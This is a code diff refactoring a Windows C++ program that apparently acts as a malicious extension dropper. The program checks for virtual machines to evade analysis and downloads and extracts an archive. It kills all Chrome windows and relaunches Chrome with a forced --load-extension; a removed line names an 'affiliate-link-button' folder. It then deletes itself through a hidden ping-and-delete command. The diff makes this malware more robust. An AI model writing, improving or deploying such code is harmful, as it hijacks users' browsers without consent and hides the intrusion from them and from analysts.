@@ -4,264 +4,257 @@
 #include <locale>
 #include <codecvt>
 #include <filesystem>
-#include<direct.h>
+#include <direct.h>
 #include <strsafe.h>
 #include <chrono>
 #include <thread>
-#include <locale>
 #include <vector>
 #include <iomanip>
 #include <algorithm>
 #include <iterator>
 #include <sstream>
+#include <stdexcept>
+#include <memory>
 #pragma comment(lib, "urlmon.lib")
-
 
 #define _CRT_SECURE_NO_WARNINGS
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
-#define RUN_CHROME_STRING  TEXT("cmd.exe /C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=C:\\Users\\ADMIN\\Downloads\\affiliate-link-button")
-
+#define RUN_CHROME_STRING  TEXT("cmd.exe /C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=%s")
 
 using namespace std;
+namespace fs = std::filesystem;
+
+// Custom exception class for extension-related errors
+class ExtensionError : public std::runtime_error {
+public:
+    explicit ExtensionError(const std::string& message) : std::runtime_error(message) {}
+};
 
 struct KeyValuePair {
     string name;
     string value;
 };
 
+// RAII wrapper for Windows registry keys
+class RegistryKey {
+private:
+    HKEY hKey;
+public:
+    RegistryKey(HKEY key) : hKey(key) {}
+    ~RegistryKey() { if (hKey) RegCloseKey(hKey); }
+    operator HKEY() const { return hKey; }
+};
+
 std::string GetComputerName() {
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(computerName);
 
-    if (GetComputerNameA(computerName, &size)) {
-        return std::string(computerName);
+    if (!GetComputerNameA(computerName, &size)) {
+        throw ExtensionError("Failed to get computer name: " + std::to_string(GetLastError()));
     }
-    else {
-        return "Unknown";
-    }
+    return std::string(computerName);
 }
 
-wstring Get7ZipPath()
-{
-    HKEY key;
-    wstring path;
+wstring Get7ZipPath() {
+    RegistryKey key(nullptr);
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\7-Zip"), 0, KEY_READ, &key) != ERROR_SUCCESS) {
+        throw ExtensionError("7-Zip is not installed");
+    }
 
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\7-Zip"), 0, KEY_READ, &key) == ERROR_SUCCESS) {
-        wchar_t buffer[MAX_PATH];
-        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);
+    wchar_t buffer[MAX_PATH];
+    DWORD bufferSize = MAX_PATH * sizeof(wchar_t);
 
-        // Get the installation path from the registry value
-        if (RegGetValue(key, nullptr, TEXT("Path"), RRF_RT_REG_SZ, nullptr, buffer, &bufferSize) == ERROR_SUCCESS) {
-            path = buffer;
-            path += L"7z.exe";
-        }
+    if (RegGetValue(key, nullptr, TEXT("Path"), RRF_RT_REG_SZ, nullptr, buffer, &bufferSize) != ERROR_SUCCESS) {
+        throw ExtensionError("Failed to get 7-Zip path");
+    }
 
-        // Close the registry key
-        RegCloseKey(key);
+    std::wstring path = buffer;
+    path += L"7z.exe";
+    
+    if (!fs::exists(path)) {
+        throw ExtensionError("7-Zip executable not found at: " + std::string(path.begin(), path.end()));
     }
 
     return path;
 }
 
 bool IsChromeInstalled() {
-    HKEY hKey;
-    bool isInstalled = false;
-
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Google\\Chrome", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        isInstalled = true;
-        RegCloseKey(hKey);
-    }
-
-    return isInstalled;
+    RegistryKey key(nullptr);
+    return RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Google\\Chrome", 0, KEY_READ, &key) == ERROR_SUCCESS;
 }
 
 float GetRamCapacity() {
     MEMORYSTATUSEX statex;
     statex.dwLength = sizeof(statex);
 
-    GlobalMemoryStatusEx(&statex);
+    if (!GlobalMemoryStatusEx(&statex)) {
+        throw ExtensionError("Failed to get memory status");
+    }
 
-    return (float)statex.ullTotalPhys / (1024 * 1024 * 1024.0);
+    return static_cast<float>(statex.ullTotalPhys) / (1024 * 1024 * 1024.0f);
 }
 
 bool IsVirtualComputer() {
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
-    {
-        RegCloseKey(hKey);
-        return true;
+    // Check common virtualization software
+    const wchar_t* virtualKeys[] = {
+        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
+        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
+    };
+
+    for (const auto& keyPath : virtualKeys) {
+        RegistryKey key(nullptr);
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &key) == ERROR_SUCCESS) {
+            return true;
+        }
     }
 
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Oracle\\VirtualBox Guest Additions"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
-    {
-        RegCloseKey(hKey);
-        return true;
-    }
-
-    // Check for Hyper-V virtual machine
-    if (IsProcessorFeaturePresent(PF_VIRT_FIRMWARE_ENABLED))
-    {
-        return true;
-    }
-
-    return false;
+    // Check for Hyper-V
+    return IsProcessorFeaturePresent(PF_VIRT_FIRMWARE_ENABLED);
 }
 
-string GetFileNameFromPath(string path) {
+string GetFileNameFromPath(string_view path) {
     size_t lastSlash = path.find_last_of("/\\");
-    if (lastSlash != std::string::npos) {
-        return path.substr(lastSlash + 1);
-    }
-    return path;
+    return lastSlash != string_view::npos ? string(path.substr(lastSlash + 1)) : string(path);
 }
 
-void DownloadExtension(string url, string path) {
+void DownloadExtension(string_view url, string_view path) {
+    wstring tempUrl(url.begin(), url.end());
+    wstring tempPath(path.begin(), path.end());
 
-    wstring tempUrl = wstring(url.begin(), url.end());
-    wstring tempPath = wstring(path.begin(), path.end());
-
-    LPCWSTR wideStringUrl = tempUrl.c_str();
-    LPCWSTR wideStringPath = tempPath.c_str();
-
-    if (S_OK == URLDownloadToFile(NULL, wideStringUrl, wideStringPath, 0, NULL)) {
-        //cout << "Downlod: Succses" << endl;
-    }
-    else {
-        //cout << "Download: Fails" << endl;
+    if (S_OK != URLDownloadToFile(NULL, tempUrl.c_str(), tempPath.c_str(), 0, NULL)) {
+        throw ExtensionError("Failed to download extension from: " + string(url));
     }
 }
 
-string WStringToString(wstring wstr) {
+string WStringToString(wstring_view wstr) {
     std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
-    return converter.to_bytes(wstr);
+    return converter.to_bytes(wstring(wstr));
 }
 
-void ExtractExtension(string path, string destination)
-{
+void ExtractExtension(string_view path, string_view destination) {
     string programPath = WStringToString(Get7ZipPath());
-    string command = "cd " + destination + " && ";
-    //system(command.c_str());
-    command += "\"" + programPath + "\"" + " x " + path;// +" -ooutput " + destination;
-    system(command.c_str());
+    
+    // Create destination directory if it doesn't exist
+    fs::create_directories(string(destination));
+
+    string command = "\"" + programPath + "\" x \"" + string(path) + "\" -o\"" + string(destination) + "\" -y";
+    int result = system(command.c_str());
+    
+    if (result != 0) {
+        throw ExtensionError("Failed to extract extension");
+    }
 }
-
-
 
 wstring GetChromeLocation() {
-    HKEY hKey;
-    std::wstring chromeLocation;
-
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
-        wchar_t buffer[MAX_PATH];
-        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);
-
-        if (RegQueryValueEx(hKey, nullptr, nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
-            chromeLocation = buffer;
-        }
-
-        RegCloseKey(hKey);
+    RegistryKey key(nullptr);
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), 
+                     0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS) {
+        throw ExtensionError("Chrome installation not found");
     }
 
-    return chromeLocation;
-}
+    wchar_t buffer[MAX_PATH];
+    DWORD bufferSize = MAX_PATH * sizeof(wchar_t);
 
-string GetCurrentFolder() {
-    char buffer[MAX_PATH];
-    if (GetCurrentDirectoryA(MAX_PATH, buffer)) {
-        //std::cout << "Current working directory: " << buffer << std::endl;
-    }
-    else {
-        //std::cout << "Failed to get current working directory." << std::endl;
+    if (RegQueryValueEx(key, nullptr, nullptr, nullptr, (LPBYTE)buffer, &bufferSize) != ERROR_SUCCESS) {
+        throw ExtensionError("Failed to get Chrome executable path");
     }
 
     return buffer;
 }
 
-void OpenChrome(string extensionLocation)
-{
+string GetCurrentFolder() {
+    char buffer[MAX_PATH];
+    if (!GetCurrentDirectoryA(MAX_PATH, buffer)) {
+        throw ExtensionError("Failed to get current directory");
+    }
+    return buffer;
+}
+
+void OpenChrome(string_view extensionLocation) {
     wstring chrome = GetChromeLocation();
     string chromePath = WStringToString(chrome);
-    string command = "\"" + chromePath + "\"" + " --load-extension=" + extensionLocation;
-    system(command.c_str());
-}
-
-
-string WCharToString(const wchar_t* wstr) {
-    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-    return converter.to_bytes(wstr);
-}
-
-void ReplaceSubstring(std::string& original, const std::string& from, const std::string& to) {
-    size_t startPos = original.find(from);
-    while (startPos != std::string::npos) {
-        original.replace(startPos, from.length(), to);
-        startPos = original.find(from, startPos + to.length());
+    
+    // Format command with proper escaping
+    string command = "\"" + chromePath + "\" --load-extension=\"" + string(extensionLocation) + "\"";
+    
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    if (!CreateProcessA(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        throw ExtensionError("Failed to launch Chrome");
     }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
 
-std::string GenerateGUID() {
+string GenerateGUID() {
     GUID guid;
-    CoCreateGuid(&guid);
+    if (FAILED(CoCreateGuid(&guid))) {
+        throw ExtensionError("Failed to generate GUID");
+    }
 
     wchar_t guidStr[40];
-    auto _ = StringFromGUID2(guid, guidStr, sizeof(guidStr) / sizeof(guidStr[0]));
-    string result = WCharToString(guidStr);
-    ReplaceSubstring(result, "{", "");
-    ReplaceSubstring(result, "}", "");
+    if (!StringFromGUID2(guid, guidStr, sizeof(guidStr) / sizeof(guidStr[0]))) {
+        throw ExtensionError("Failed to convert GUID to string");
+    }
+
+    string result = WStringToString(guidStr);
+    result.erase(std::remove(result.begin(), result.end(), '{'), result.end());
+    result.erase(std::remove(result.begin(), result.end(), '}'), result.end());
     return result;
 }
 
-string GetFileNameWithoutExtension(string filePath) {
-    size_t lastSlash = filePath.find_last_of("/\\");
-    size_t lastDot = filePath.find_last_of(".");
-    if (lastDot != std::string::npos && (lastSlash == std::string::npos || lastDot > lastSlash)) {
-        return filePath.substr(lastSlash + 1, lastDot - lastSlash - 1);
-    }
-
-    return filePath.substr(lastSlash + 1);
+string GetFileNameWithoutExtension(string_view filePath) {
+    string fileName = GetFileNameFromPath(filePath);
+    size_t lastDot = fileName.find_last_of('.');
+    return lastDot != string::npos ? fileName.substr(0, lastDot) : fileName;
 }
 
 string GetTempFolder() {
-    char* tempPath = nullptr;
-    size_t size;
-    errno_t err = _dupenv_s(&tempPath, &size, "TEMP");
-    if (err == 0 && tempPath != nullptr) {
-        string tempFolder(tempPath);
-        free(tempPath);
-        return tempFolder;
+    unique_ptr<char[]> tempPath(new char[MAX_PATH]);
+    DWORD result = GetTempPathA(MAX_PATH, tempPath.get());
+    
+    if (result == 0 || result > MAX_PATH) {
+        throw ExtensionError("Failed to get temp folder path");
     }
-    return "";
+    
+    return string(tempPath.get());
 }
 
 void CloseAllChrome() {
+    vector<HWND> chromeWindows;
     HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
+    
     while (hwnd) {
-        PostMessage(hwnd, WM_CLOSE, 0, 0);
+        chromeWindows.push_back(hwnd);
         hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
     }
 
-    //std::cout << "All Chrome instances closed." << std::endl;
-
-    return;
+    for (HWND window : chromeWindows) {
+        if (!PostMessage(window, WM_CLOSE, 0, 0)) {
+            // Log warning but continue with other windows
+            OutputDebugStringA("Failed to close Chrome window\n");
+        }
+    }
 }
 
-void DelMe()
-{
-    TCHAR szModuleName[MAX_PATH];
-    TCHAR szCmd[2 * MAX_PATH];
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-
-    GetModuleFileName(NULL, szModuleName, MAX_PATH);
-
-    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
-
-    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+void DelMe() {
+    wchar_t szModuleName[MAX_PATH];
+    if (GetModuleFileNameW(NULL, szModuleName, MAX_PATH)) {
+        wchar_t szCmd[2 * MAX_PATH];
+        StringCbPrintfW(szCmd, 2 * MAX_PATH * sizeof(wchar_t), SELF_REMOVE_STRING, szModuleName);
+        
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        
+        if (CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
 }
-
 
 vector<KeyValuePair> EnumerateRegistryKeysAndValues(HKEY key) {
     vector<KeyValuePair> result;
